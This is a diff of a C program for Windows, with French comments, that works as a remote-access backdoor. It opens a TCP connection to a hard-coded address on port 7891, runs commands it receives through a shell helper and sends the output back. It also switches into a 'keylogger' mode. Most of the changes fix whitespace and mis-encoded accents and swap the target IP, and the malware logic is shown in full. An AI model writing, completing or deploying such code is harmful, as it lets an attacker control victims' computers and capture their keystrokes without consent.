@@ -1,4 +1,4 @@
-#include <stdio.h>		
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 
@@ -11,15 +11,15 @@ int main()
     WSADATA WSAData;
     SOCKET sock;
     SOCKADDR_IN sin;
-    char buffer[10000]; // Est-ce que Ã§a n'est pas juste ca 
+    char buffer[10000]; // Est-ce que ça n'est pas juste ca
     char sentence[1040];
     char* command = NULL;
     char mode[20]= "none";
-   
+
     WSAStartup(MAKEWORD(2,0), &WSAData);
-    /* Tout est configurÃ© pour se connecter sur IRC, haarlem, Undernet. */
+    /* Tout est configuré pour se connecter sur IRC, haarlem, Undernet. */
     sock = socket(AF_INET, SOCK_STREAM, 0);
-    sin.sin_addr.s_addr = inet_addr("192.168.1.13");
+    sin.sin_addr.s_addr = inet_addr("10.4.3.67");
     sin.sin_family = AF_INET;
     sin.sin_port = htons(7891);
 
@@ -35,7 +35,7 @@ int main()
 		 puts("failed to received data");
 		}
 		//buffer[n] = '\0';
-		
+
 		puts("command received : ");
 		printf("buffer is : %s \n", buffer);
 		//Si mode commande, execution de la commande via le script shell.c
@@ -47,14 +47,13 @@ int main()
 				exit(0);
 			}
 			strcpy(command,buffer);
-			printf("go\n");
-			printf("command envoyÃ©e : %d\n", command );
+			printf("command envoyée : %d\n", command );
 			char* path = shellcommand(command);
 			printf("le path est : %s\n", path);
 			send(sock, path, (strlen(path))*sizeof(char), 0);
 			free(command);
-		}	 
-		//Fixe le mode en fonction de la commande envoyÃ©e
+		}
+		//Fixe le mode en fonction de la commande envoyée
 		//si command, on passen mode commande
 		if(strcmp(buffer,"command\n") == 0){
 			strcpy(mode,"command");
@@ -62,8 +61,8 @@ int main()
 			send(sock,message,strlen(message),0);
 			printf("%s\n", "command mode, message sent");
 			printf("strcmp(mode,command) : %d\n",strcmp(mode,"command"));
-			
-		
+
+
 		}
 		else if(strcmp(buffer,"keylogger\n") == 0){
 			strcpy(mode,buffer);
